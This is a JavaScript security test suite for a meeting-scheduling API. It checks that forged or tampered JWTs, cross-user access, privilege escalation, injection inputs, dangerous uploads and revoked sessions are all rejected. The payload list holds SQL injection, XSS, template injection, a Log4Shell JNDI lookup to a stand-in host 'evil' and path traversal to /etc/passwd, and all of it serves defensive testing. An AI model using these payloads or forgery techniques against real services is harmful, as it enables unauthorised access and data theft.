// Security suite: authentication bypass, token tampering, privilege escalation, IDOR, injection, abuse.
// Usage: node qa/security.mjs
import { call, newUser, jwt, decode, rid, iso, Report, JWT_ISSUER } from './lib.mjs';

const R = new Report('Security suite');

async function main() {
  const victim = await newUser('Victim');
  const attacker = await newUser('Attacker');
  const claims = decode(victim.token);
  const now = Math.floor(Date.now() / 1000);

  // ------------------------------------------------------------------ token forgery
  R.section = 'jwt';
  const forged = [
    ['alg none', jwt({ ...claims, sys_role: 'SYSTEM_ADMIN' }, { alg: 'none' })],
    ['signed with wrong secret', jwt({ ...claims, sys_role: 'SYSTEM_ADMIN' }, { secret: 'wrong-secret-wrong-secret-wrong-secret!' })],
    ['payload tampered, original signature', (() => { const [h, , s] = victim.token.split('.'); return `${h}.${Buffer.from(JSON.stringify({ ...claims, sys_role: 'SYSTEM_ADMIN' })).toString('base64url')}.${s}`; })()],
    ['expired (validly signed)', jwt({ ...claims, iat: now - 7200, nbf: now - 7200, exp: now - 3600 })],
    ['not yet valid (validly signed)', jwt({ ...claims, iat: now, nbf: now + 3600, exp: now + 7200 })],
    ['wrong audience (validly signed)', jwt({ ...claims, aud: ['other-api'] })],
    ['wrong issuer (validly signed)', jwt({ ...claims, iss: 'evil' })],
    ['no session id (validly signed)', jwt({ ...claims, sid: undefined })],
    ['unknown session id (validly signed)', jwt({ ...claims, sid: '00000000-0000-0000-0000-000000000000' })],
    ['garbage', 'not.a.token'],
    ['empty bearer', ''],
  ];
  for (const [name, token] of forged) {
    const r = await call('GET', '/users/me', { headers: { Authorization: `Bearer ${token}` } });
    R.status(`rejects ${name}`, r, 401);
  }
  // A validly signed token whose claims say SYSTEM_ADMIN but whose session belongs to a normal user:
  // this is only possible if the signing secret leaked; documented as a key-management requirement.
  const adminByForgery = await call('GET', '/admin/stats', { token: jwt({ ...decode(attacker.token), sys_role: 'SYSTEM_ADMIN' }, { secret: 'not-the-secret-not-the-secret-123456' }) });
  R.status('cannot escalate to admin with forged signature', adminByForgery, 401);
  R.status('normal user cannot reach admin', await call('GET', '/admin/users', { token: attacker.token }), 403);
  R.status('admin PATCH user forbidden for normal user', await call('PATCH', `/admin/users/${attacker.id}`, { token: attacker.token, body: { systemRole: 'SYSTEM_ADMIN' } }), 403);
  R.check('issuer claim is the configured one', claims.iss === JWT_ISSUER, claims.iss);
  R.check('access token lifetime <= 15 min', claims.exp - claims.iat <= 900, `${claims.exp - claims.iat}s`);
  R.check('no password/secret material in token', !JSON.stringify(claims).match(/password|secret/i));

  // ------------------------------------------------------------------ IDOR across resources
  R.section = 'idor';
  const meeting = (await call('POST', '/meetings', { token: victim.token, body: { title: 'Secret strategy', type: 'SCHEDULED', timeZone: 'UTC', startTime: iso(Date.now() + 86400e3), privacy: 'INVITEES_ONLY', password: 'hunter2hunter2' } })).json;
  R.status('cannot read other user meeting', await call('GET', `/meetings/${meeting.id}`, { token: attacker.token }), 404);
  R.status('cannot edit other user meeting', await call('PATCH', `/meetings/${meeting.id}`, { token: attacker.token, body: { title: 'pwned' } }), 404);
  R.status('cannot cancel other user meeting', await call('POST', `/meetings/${meeting.id}/cancel`, { token: attacker.token }), 404);
  R.status('cannot list invitations', await call('GET', `/meetings/${meeting.id}/invitations`, { token: attacker.token }), 404);
  R.status('cannot invite self', await call('POST', `/meetings/${meeting.id}/invitations`, { token: attacker.token, body: { emails: [attacker.email] } }), 404);
  R.status('cannot list participants', await call('GET', `/meetings/${meeting.id}/participants`, { token: attacker.token }), 404);
  R.status('cannot read sessions', await call('GET', `/rooms/${meeting.id}/sessions`, { token: attacker.token }), 404);
  R.status('cannot moderate', await call('POST', `/meetings/${meeting.id}/moderation/lock`, { token: attacker.token, body: { locked: true } }), 404);
  R.status('cannot read moderation audit', await call('GET', `/meetings/${meeting.id}/moderation/audit`, { token: attacker.token }), 404);
  R.status('cannot start recording', await call('POST', `/meetings/${meeting.id}/recordings`, { token: attacker.token }), 404);
  R.status('cannot list recordings', await call('GET', `/meetings/${meeting.id}/recordings`, { token: attacker.token }), 404);
  R.status('cannot end', await call('POST', `/meetings/${meeting.id}/end`, { token: attacker.token }), [404, 409]);
  R.status('cannot join private meeting', await call('POST', `/meetings/${meeting.id}/join`, { token: attacker.token, body: { password: 'hunter2hunter2' } }), 403, 'NOT_INVITED');
  const byCode = await call('GET', `/meetings/by-code/${meeting.joinCode}`);
  R.check('public summary does not leak password or invitees', byCode.status === 200 && !/hunter2|passwordHash|@example/.test(byCode.text), byCode.text);
  const victimSessions = await call('GET', '/users/me/sessions', { token: victim.token });
  R.status('cannot revoke other user session', await call('DELETE', `/users/me/sessions/${victimSessions.json[0].id}`, { token: attacker.token }), 404);
  const org = (await call('POST', '/organizations', { token: victim.token, body: { name: 'Victim Org', slug: `victim-${rid()}` } })).json;
  R.status('cannot read org', await call('GET', `/organizations/${org.id}`, { token: attacker.token }), 404);
  R.status('cannot list org members', await call('GET', `/organizations/${org.id}/members`, { token: attacker.token }), 404);
  R.status('cannot add self to org', await call('POST', `/organizations/${org.id}/members`, { token: attacker.token, body: { email: attacker.email, role: 'ORGANIZATION_ADMIN' } }), 404);
  R.status('cannot change org', await call('PATCH', `/organizations/${org.id}`, { token: attacker.token, body: { name: 'pwned' } }), 404);
  R.status('cannot remove org member', await call('DELETE', `/organizations/${org.id}/members/${victim.id}`, { token: attacker.token }), 404);
  R.status('cannot create meeting in foreign org', await call('POST', '/meetings', { token: attacker.token, body: { title: 'x', type: 'INSTANT', timeZone: 'UTC', organizationId: org.id } }), 403);
  const page = (await call('POST', '/booking-pages', { token: victim.token, body: { slug: `v-${rid()}`, title: 'Victim page', durationMinutes: 30 } })).json;
  R.status('cannot read booking page', await call('GET', `/booking-pages/${page.id}`, { token: attacker.token }), 404);
  R.status('cannot edit booking page', await call('PATCH', `/booking-pages/${page.id}`, { token: attacker.token, body: { title: 'pwned' } }), 404);
  R.status('cannot delete booking page', await call('DELETE', `/booking-pages/${page.id}`, { token: attacker.token }), 404);
  const exc = (await call('POST', '/availability/exceptions', { token: victim.token, body: { date: '2030-01-01', available: false } })).json;
  R.status('cannot delete availability exception', await call('DELETE', `/availability/exceptions/${exc.id}`, { token: attacker.token }), 404);

  // live meeting: participant tokens are bound to their meeting and participant
  const live = (await call('POST', '/meetings', { token: victim.token, body: { title: 'Live', type: 'INSTANT', timeZone: 'UTC' } })).json;
  const other = (await call('POST', '/meetings', { token: attacker.token, body: { title: 'Other', type: 'INSTANT', timeZone: 'UTC' } })).json;
  const hostJoin = (await call('POST', `/meetings/${live.id}/join`, { token: victim.token })).json;
  await call('POST', `/meetings/${other.id}/join`, { token: attacker.token });
  const guest = (await call('POST', `/meetings/${live.id}/join`, { body: { displayName: 'Guest' } })).json;
  const atkGuest = (await call('POST', `/meetings/${other.id}/join`, { body: { displayName: 'Mallory' } })).json;
  R.status('participant token of meeting B rejected in meeting A', await call('GET', `/meetings/${live.id}/chat`, { headers: { 'X-Participant-Token': atkGuest.waitToken } }), 403);
  R.status('cannot post chat as another participant', await call('POST', `/meetings/${live.id}/chat`, { headers: { 'X-Participant-Token': atkGuest.waitToken }, body: { participantId: guest.participantId, text: 'spoof' } }), 403);
  R.status('cannot post chat as the host with own token', await call('POST', `/meetings/${live.id}/chat`, { headers: { 'X-Participant-Token': guest.waitToken }, body: { participantId: hostJoin.participantId, text: 'spoof' } }), 403);
  R.status('cannot make another participant leave', await call('POST', `/meetings/${live.id}/leave`, { headers: { 'X-Participant-Token': guest.waitToken }, body: { participantId: hostJoin.participantId } }), 403);
  R.status('signed-in stranger cannot leave for host', await call('POST', `/meetings/${live.id}/leave`, { token: attacker.token, body: { participantId: hostJoin.participantId } }), 403);
  R.status('cannot poll another participant status', await call('GET', `/meetings/${live.id}/join-status?participantId=${hostJoin.participantId}`, { headers: { 'X-Participant-Token': guest.waitToken } }), 403);
  R.status('guest cannot announce local recording for host', await call('POST', `/meetings/${live.id}/local-recordings`, { headers: { 'X-Participant-Token': guest.waitToken }, body: { participantId: hostJoin.participantId, state: 'STARTED' } }), 403);
  R.status('guest cannot moderate', await call('POST', `/meetings/${live.id}/moderation/mute-all`, { headers: { 'X-Participant-Token': guest.waitToken } }), 401);
  R.check('LiveKit token never grants admin', !JSON.stringify(decode(hostJoin.token)).includes('roomAdmin'), JSON.stringify(decode(hostJoin.token)));
  R.check('guest LiveKit token is scoped to one room', decode(guest.token).video?.room === hostJoin.roomName, JSON.stringify(decode(guest.token).video));
  R.check('LiveKit token lifetime <= 10 min', decode(guest.token).exp - Math.floor(Date.now() / 1000) <= 600, decode(guest.token).exp);

  // ------------------------------------------------------------------ injection & malicious input
  R.section = 'input';
  const payloads = ["' OR '1'='1", "'; DROP TABLE users; --", '<script>alert(1)</script>', '{{7*7}}', '${jndi:ldap://evil/x}', '../../../../etc/passwd', '\u0000nul', '🙂 مرحبا 你好'];
  for (const p of payloads) {
    const r = await call('POST', '/meetings', { token: victim.token, body: { title: p.replace('\u0000', ''), description: p, type: 'INSTANT', timeZone: 'UTC' } });
    R.check(`stored verbatim, never executed: ${JSON.stringify(p).slice(0, 30)}`, r.status === 201 && r.json.title === p.replace('\u0000', ''), `${r.status} ${r.text.slice(0, 200)}`);
  }
  const nul = await call('POST', '/meetings', { token: victim.token, body: { title: 'a\u0000b', type: 'INSTANT', timeZone: 'UTC' } });
  R.check('NUL byte in text does not cause 500', nul.status !== 500, `${nul.status} ${nul.text.slice(0, 200)}`);
  R.status('SQL in login email rejected as invalid', await call('POST', '/auth/login', { body: { email: "a' OR 1=1 --@x.com", password: 'x' } }), [400, 401]);
  R.status('SQL in search is harmless', await call('GET', `/meetings?scope=${encodeURIComponent("upcoming' OR 1=1 --")}`, { token: victim.token }), 400);
  R.status('oversized title rejected', await call('POST', '/meetings', { token: victim.token, body: { title: 'x'.repeat(201), type: 'INSTANT', timeZone: 'UTC' } }), 400, 'VALIDATION_FAILED');
  R.status('oversized description rejected', await call('POST', '/meetings', { token: victim.token, body: { title: 'x', description: 'x'.repeat(5001), type: 'INSTANT', timeZone: 'UTC' } }), 400);
  R.status('too many invitees rejected', await call('POST', '/meetings', { token: victim.token, body: { title: 'x', type: 'INSTANT', timeZone: 'UTC', inviteeEmails: Array.from({ length: 301 }, (_, i) => `u${i}@example.test`) } }), 400);
  R.status('oversized chat rejected', await call('POST', `/meetings/${live.id}/chat`, { headers: { 'X-Participant-Token': guest.waitToken }, body: { participantId: guest.participantId, text: 'x'.repeat(4001) } }), 400);
  const huge = await call('POST', '/auth/login', { body: JSON.stringify({ email: 'a@b.c', password: 'x'.repeat(2_000_000) }) });
  R.check('2 MB JSON body handled without 500', huge.status !== 500 && huge.status !== 0, `${huge.status}`);
  R.status('wrong content type', await call('POST', '/auth/login', { body: 'email=a', headers: { 'Content-Type': 'text/plain' } }), 415);
  R.status('array instead of object', await call('POST', '/auth/login', { body: '[]' }), 400);
  R.status('enum injection', await call('POST', '/meetings', { token: victim.token, body: { title: 'x', type: 'SUPER_ADMIN', timeZone: 'UTC' } }), 400);
  R.status('negative capacity', await call('POST', '/meetings', { token: victim.token, body: { title: 'x', type: 'INSTANT', timeZone: 'UTC', maxParticipants: -5 } }), 400);
  R.status('absurd duration', await call('POST', '/meetings', { token: victim.token, body: { title: 'x', type: 'INSTANT', timeZone: 'UTC', durationMinutes: 999999 } }), 400);
  R.status('bad uuid in path', await call('GET', '/meetings/1%27%20OR%201%3D1', { token: victim.token }), 400);
  R.status('header injection in idempotency key rejected', await call('POST', '/meetings', { token: victim.token, headers: { 'Idempotency-Key': 'bad key with spaces!!' }, body: { title: 'x', type: 'INSTANT', timeZone: 'UTC' } }), 400);
  const fd = new FormData();
  fd.append('file', new Blob(['%PDF-1.4'], { type: 'application/pdf' }), '../../../../etc/passwd.pdf');
  fd.append('participantId', hostJoin.participantId);
  const trav = await call('POST', `/meetings/${live.id}/files`, { token: victim.token, body: fd });
  R.check('path traversal filename not rejected with 500 (storage offline → 503 expected)', [201, 503].includes(trav.status), `${trav.status} ${trav.text.slice(0, 200)}`);
  for (const [name, type] of [['shell.php', 'application/x-php'], ['x.html', 'text/html'], ['x.svg', 'image/svg+xml'], ['x.js', 'application/javascript']]) {
    const f = new FormData();
    f.append('file', new Blob(['x'], { type }), name);
    f.append('participantId', hostJoin.participantId);
    R.status(`dangerous upload rejected: ${name}`, await call('POST', `/meetings/${live.id}/files`, { token: victim.token, body: f }), 415);
  }

  // ------------------------------------------------------------------ response hygiene
  R.section = 'hygiene';
  const err = await call('GET', '/meetings/not-a-uuid', { token: victim.token });
  R.check('errors never include stack traces', !/at com\.|Exception|\.java/.test(err.text), err.text);
  const me = await call('GET', '/users/me', { token: victim.token });
  R.check('profile never exposes password hash', !/password|\$2a\$|bcrypt/i.test(me.text), me.text);
  R.check('security headers present', me.headers.get('x-content-type-options') === 'nosniff' && me.headers.get('x-frame-options') === 'DENY', `${me.headers.get('x-content-type-options')} ${me.headers.get('x-frame-options')}`);
  const login = await call('POST', '/auth/login', { body: { email: victim.email, password: 'a long local test passphrase' } });
  R.check('auth responses not cacheable', /no-store/.test(login.headers.get('cache-control') || ''), login.headers.get('cache-control'));
  const unknown = await call('POST', '/auth/login', { body: { email: `nobody+${rid()}@example.test`, password: 'whatever whatever' } });
  const wrong = await call('POST', '/auth/login', { body: { email: victim.email, password: 'whatever whatever' } });
  R.check('login does not reveal whether account exists', unknown.json?.detail === wrong.json?.detail && unknown.status === wrong.status, `${unknown.json?.detail} vs ${wrong.json?.detail}`);
  R.check('timing similar for unknown vs known account (<3x)', unknown.ms < wrong.ms * 3 && wrong.ms < unknown.ms * 3, `${unknown.ms.toFixed(0)}ms vs ${wrong.ms.toFixed(0)}ms`);
  const reset1 = await call('POST', '/auth/password-reset/request', { body: { email: victim.email } });
  const reset2 = await call('POST', '/auth/password-reset/request', { body: { email: `ghost+${rid()}@example.test` } });
  R.check('password reset does not reveal accounts', reset1.status === 202 && reset2.status === 202 && reset1.text === reset2.text);
  const reg = await call('POST', '/auth/register', { body: { email: victim.email, password: 'a long local test passphrase', displayName: 'x', timeZone: 'UTC' } });
  R.status('duplicate registration is a clean 409', reg, 409);

  // ------------------------------------------------------------------ session lifecycle
  R.section = 'sessions';
  const s = await newUser('Session');
  R.status('logout revokes refresh', await call('POST', '/auth/logout', { body: { refreshToken: s.refresh } }), 204);
  R.status('revoked refresh rejected', await call('POST', '/auth/refresh', { body: { refreshToken: s.refresh } }), 401);
  await new Promise((r) => setTimeout(r, 11000));
  R.status('access token dies with its session (<=10s cache)', await call('GET', '/users/me', { token: s.token }), 401);

  return R.print();
}

main().then((failed) => process.exit(failed ? 1 : 0)).catch((e) => { console.error('FATAL', e); R.print(); process.exit(2); });
